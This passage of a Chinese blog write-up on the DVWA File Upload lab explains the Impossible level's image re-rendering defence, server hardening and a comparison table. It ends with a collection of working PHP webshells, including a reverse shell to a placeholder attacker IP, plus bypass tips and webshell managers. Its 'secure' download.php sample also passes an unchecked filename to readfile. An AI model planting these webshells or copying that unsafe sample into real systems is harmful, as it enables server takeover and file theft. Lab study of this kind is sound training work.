class="keyword">elseif</span>( <span class="variable">$uploaded_ext</span> == <span class="string">&#x27;png&#x27;</span> ) &#123;</span><br><span class="line">            <span class="comment">// imagecreatefrompng() - 从PNG文件创建图像</span></span><br><span class="line">            <span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatefrompng</span>( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 改进4：保存重新渲染的图片 ★★★</span></span><br><span class="line">        <span class="comment">// imagejpeg() - 将图像输出到文件</span></span><br><span class="line">        <span class="comment">// 参数1：图像资源</span></span><br><span class="line">        <span class="comment">// 参数2：文件路径</span></span><br><span class="line">        <span class="comment">// 参数3：质量（0-100）</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 结果：</span></span><br><span class="line">        <span class="comment">// 1. 即使上传的图片包含PHP代码</span></span><br><span class="line">        <span class="comment">// 2. 重新渲染后，PHP代码被清除</span></span><br><span class="line">        <span class="comment">// 3. 只保存纯净的图片数据</span></span><br><span class="line">        <span class="title function_ invoke__">imagejpeg</span>( <span class="variable">$img</span>, <span class="variable">$target_path</span>, <span class="number">100</span> );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_file&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成新的Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><p><strong>多层防御：</strong></p>
+<ol>
+<li><strong>CSRF Token</strong> - 防止跨站请求伪造</li>
+<li><strong>文件重命名</strong> - 使用MD5+时间戳，无法预测</li>
+<li><strong>扩展名白名单</strong> - 只允许jpg, jpeg, png</li>
+<li><strong>文件大小限制</strong> - 100KB</li>
+<li><strong>getimagesize()验证</strong> - 确保是真实图片</li>
+<li><strong>图片重新渲染</strong> - 使用GD库清除恶意代码</li>
+</ol>
+<p><strong>图片重新渲染原理：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">输入：shell.jpg（包含PHP代码）</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagecreatefromjpeg</span>()：</span><br><span class="line"><span class="number">1</span>. 读取图片的像素数据</span><br><span class="line"><span class="number">2</span>. 忽略其他所有内容（包括PHP代码）</span><br><span class="line"><span class="number">3</span>. 创建新的图像资源（只有像素数据）</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagejpeg</span>()：</span><br><span class="line"><span class="number">1</span>. 将图像资源保存为JPEG文件</span><br><span class="line"><span class="number">2</span>. 只写入图片数据</span><br><span class="line"><span class="number">3</span>. PHP代码被完全清除</span><br><span class="line"></span><br><span class="line">输出：纯净的图片（无恶意代码）</span><br></pre></td></tr></table></figure>
+
+<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>所有攻击都失败：</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">尝试<span class="number">1</span>：上传shell<span class="selector-class">.php</span></span><br><span class="line">扩展名检查 → 失败（不是jpg/jpeg/png）</span><br><span class="line"></span><br><span class="line">尝试<span class="number">2</span>：上传shell.jpg（图片马）</span><br><span class="line"><span class="function"><span class="title">getimagesize</span><span class="params">()</span></span> → 通过（是有效图片）</span><br><span class="line"><span class="function"><span class="title">imagecreatefromjpeg</span><span class="params">()</span></span> → 重新渲染，移除PHP代码</span><br><span class="line">最终文件 → 纯净的图片，无法执行PHP</span><br><span class="line"></span><br><span class="line">尝试<span class="number">3</span>：修改Content-Type</span><br><span class="line">无效（服务器检查实际文件内容，不依赖Content-Type）</span><br><span class="line"></span><br><span class="line">尝试<span class="number">4</span>：双扩展名shell<span class="selector-class">.php</span><span class="selector-class">.jpg</span></span><br><span class="line">扩展名检查 → <span class="built_in">pathinfo</span>()只取最后的扩展名(.jpg)</span><br><span class="line">重新渲染 → PHP代码被清除</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键防御点：</strong></p>
+<ol>
+<li><strong>图片重新渲染是关键</strong> - 即使上传成功，也无法执行PHP</li>
+<li><strong>文件重命名</strong> - 无法预测文件路径</li>
+<li><strong>白名单机制</strong> - 只允许已知安全的扩展名</li>
+<li><strong>多层验证</strong> - 任何一层失败都会拒绝</li>
+</ol>
+<hr>
+<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><h4 id="1-文件类型验证（多层验证）"><a href="#1-文件类型验证（多层验证）" class="headerlink" title="1. 文件类型验证（多层验证）"></a>1. 文件类型验证（多层验证）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 检查扩展名</span></span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line"><span class="variable">$allowed</span> = [<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid file type&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 检查MIME类型（不可完全信任，作为辅助）</span></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="variable">$mime</span> = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="variable">$allowed_mimes</span> = [<span class="string">&#x27;image/jpeg&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>, <span class="string">&#x27;image/gif&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$mime</span>, <span class="variable">$allowed_mimes</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid MIME type&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 检查文件内容（最可靠）</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Not a valid image&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-文件重命名"><a href="#2-文件重命名" class="headerlink" title="2. 文件重命名"></a>2. 文件重命名</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用随机名称</span></span><br><span class="line"><span class="variable">$new_name</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">rand</span>(), <span class="literal">true</span>)) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$new_name</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-文件大小限制"><a href="#3-文件大小限制" class="headerlink" title="3. 文件大小限制"></a>3. 文件大小限制</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 限制文件大小</span></span><br><span class="line"><span class="variable">$max_size</span> = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>; <span class="comment">// 2MB</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="variable">$max_size</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;File too large&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-存储在Web根目录外"><a href="#4-存储在Web根目录外" class="headerlink" title="4. 存储在Web根目录外"></a>4. 存储在Web根目录外</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存储在不可访问的目录</span></span><br><span class="line"><span class="variable">$upload_dir</span> = <span class="string">&#x27;/var/data/uploads/&#x27;</span>;  <span class="comment">// Web根目录外</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 提供下载脚本</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// download.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="comment">// 验证文件</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$upload_dir</span> . <span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="5-图片重新渲染（推荐）"><a href="#5-图片重新渲染（推荐）" class="headerlink" title="5. 图片重新渲染（推荐）"></a>5. 图片重新渲染（推荐）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重新渲染图片（移除恶意代码）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ext</span> == <span class="string">&#x27;jpg&#x27;</span> || <span class="variable">$ext</span> == <span class="string">&#x27;jpeg&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$img</span>, <span class="variable">$target</span>, <span class="number">90</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$ext</span> == <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>, <span class="variable">$target</span>, <span class="number">9</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-设置正确的权限"><a href="#6-设置正确的权限" class="headerlink" title="6. 设置正确的权限"></a>6. 设置正确的权限</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传目录权限</span></span><br><span class="line"><span class="built_in">chmod</span> 755 uploads/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传的文件权限（不可执行）</span></span><br><span class="line"><span class="built_in">chmod</span> 644 uploaded_file.jpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁止执行PHP</span></span><br><span class="line"><span class="comment"># .htaccess</span></span><br><span class="line">php_flag engine off</span><br></pre></td></tr></table></figure>
+
+<h3 id="系统层面"><a href="#系统层面" class="headerlink" title="系统层面"></a>系统层面</h3><h4 id="1-禁止上传目录执行PHP"><a href="#1-禁止上传目录执行PHP" class="headerlink" title="1. 禁止上传目录执行PHP"></a>1. 禁止上传目录执行PHP</h4><p><strong>.htaccess：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 禁止执行PHP</span></span><br><span class="line"><span class="attribute">php_flag</span> engine <span class="literal">off</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;\.php$&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">Order</span> <span class="literal">Deny</span>,<span class="literal">Allow</span></span><br><span class="line">    <span class="attribute">Deny</span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或移除PHP处理器</span></span><br><span class="line"><span class="attribute">RemoveHandler</span> .php</span><br><span class="line"><span class="attribute">RemoveType</span> .php</span><br></pre></td></tr></table></figure>
+
+<p><strong>Nginx配置：</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /uploads/ &#123;</span><br><span class="line">    <span class="comment"># 禁止执行PHP</span></span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">deny</span> all;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-使用专门的上传目录"><a href="#2-使用专门的上传目录" class="headerlink" title="2. 使用专门的上传目录"></a>2. 使用专门的上传目录</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 上传到独立域名或子域名</span></span><br><span class="line"><span class="comment">// uploads.example.com（没有PHP执行权限）</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-扫描病毒"><a href="#3-扫描病毒" class="headerlink" title="3. 扫描病毒"></a>3. 扫描病毒</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用ClamAV扫描</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;clamscan &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$file</span>), <span class="variable">$output</span>, <span class="variable">$return</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$return</span> != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;File contains malware&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="框架层面"><a href="#框架层面" class="headerlink" title="框架层面"></a>框架层面</h3><h4 id="Laravel示例"><a href="#Laravel示例" class="headerlink" title="Laravel示例"></a>Laravel示例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用Laravel的文件验证</span></span><br><span class="line"><span class="variable">$request</span>-&gt;<span class="title function_ invoke__">validate</span>([</span><br><span class="line">    <span class="string">&#x27;avatar&#x27;</span> =&gt; <span class="string">&#x27;required|image|mimes:jpeg,png,jpg,gif|max:2048&#x27;</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存储文件</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="string">&#x27;avatar&#x27;</span>)-&gt;<span class="title function_ invoke__">store</span>(<span class="string">&#x27;avatars&#x27;</span>, <span class="string">&#x27;public&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Low</th>
+<th>Medium</th>
+<th>High</th>
+<th>Impossible</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>扩展名检查</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅ 白名单</td>
+<td>✅ 白名单</td>
+</tr>
+<tr>
+<td>MIME检查</td>
+<td>❌</td>
+<td>✅（客户端）</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>文件内容检查</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅ getimagesize</td>
+<td>✅ getimagesize</td>
+</tr>
+<tr>
+<td>文件重命名</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅ MD5</td>
+</tr>
+<tr>
+<td>图片重渲染</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅ GD库</td>
+</tr>
+<tr>
+<td>CSRF防护</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅ Token</td>
+</tr>
+<tr>
+<td>攻击难度</td>
+<td>极易</td>
+<td>简单</td>
+<td>中等</td>
+<td>极难</td>
+</tr>
+<tr>
+<td>可上传Shell</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅（图片马）</td>
+<td>❌</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="常用WebShell集合"><a href="#常用WebShell集合" class="headerlink" title="常用WebShell集合"></a>常用WebShell集合</h2><h3 id="最简单"><a href="#最简单" class="headerlink" title="最简单"></a>最简单</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;arg&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="带密码的Shell"><a href="#带密码的Shell" class="headerlink" title="带密码的Shell"></a>带密码的Shell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]) == <span class="string">&#x27;5f4dcc3b5aa765d61d8327deb882cf99&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;攻击者IP&quot;</span>, <span class="number">4444</span>);</span><br><span class="line"><span class="variable">$proc</span> = <span class="title function_ invoke__">proc_open</span>(<span class="string">&quot;/bin/sh&quot;</span>, [<span class="number">0</span>=&gt;<span class="variable">$sock</span>, <span class="number">1</span>=&gt;<span class="variable">$sock</span>, <span class="number">2</span>=&gt;<span class="variable">$sock</span>], <span class="variable">$pipes</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>学习路径：</strong></p>
+<ol>
+<li><strong>Low难度</strong> - 理解文件上传漏洞基础</li>
+<li><strong>Medium难度</strong> - 学习绕过MIME检查</li>
+<li><strong>High难度</strong> - 掌握图片马技术</li>
+<li><strong>Impossible难度</strong> - 理解完善的防御</li>
+</ol>
+<p><strong>攻击技巧：</strong></p>
+<ul>
+<li>结合文件包含漏洞利用图片马</li>
+<li>尝试上传.htaccess</li>
+<li>测试双扩展名</li>
+<li>使用Burp Suite修改请求</li>
+</ul>
+<p><strong>工具推荐：</strong></p>
+<ul>
+<li>Burp Suite - 修改上传请求</li>
+<li>中国菜刀 - WebShell管理</li>
+<li>蚁剑 - 现代WebShell管理</li>
+<li>Weevely - 隐蔽WebShell</li>
+</ul>
+<p><strong>道德准则：</strong></p>
+<ul>
+<li>只在授权环境测试</li>
+<li>不上传恶意文件到真实网站</li>
+<li>学习是为了防御，保护系统安全</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>点这里请我吃个小蛋糕吧～～</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="caixuya WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="caixuya Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>caixuya
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://caixuya.github.io/2025/11/20/File_Upload_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" title="DVWA - File Upload (文件上传) 攻防练习详解">http://caixuya.github.io/2025/11/20/File_Upload_攻防练习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/20/Insecure_CAPTCHA_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="prev" title="DVWA - Insecure CAPTCHA (不安全的验证码) 攻防练习详解">
+      <i class="fa fa-chevron-left"></i> DVWA - Insecure CAPTCHA (不安全的验证码) 攻防练习详解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/11/20/File_Inclusion_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="next" title="DVWA - File Inclusion (文件包含) 攻防练习详解">
+      DVWA - File Inclusion (文件包含) 攻防练习详解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text"></span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95"><span class="nav-number">1.1.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88File-Upload-Vulnerability%EF%BC%89%EF%BC%9F"><span class="nav-number">1.2.1.</span> <span class="nav-text">什么是文件上传漏洞（File Upload Vulnerability）？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Low-%E9%9A%BE%E5%BA%A6"><span class="nav-number">1.3.</span> <span class="nav-text">Low 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87"><span class="nav-number">1.3.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 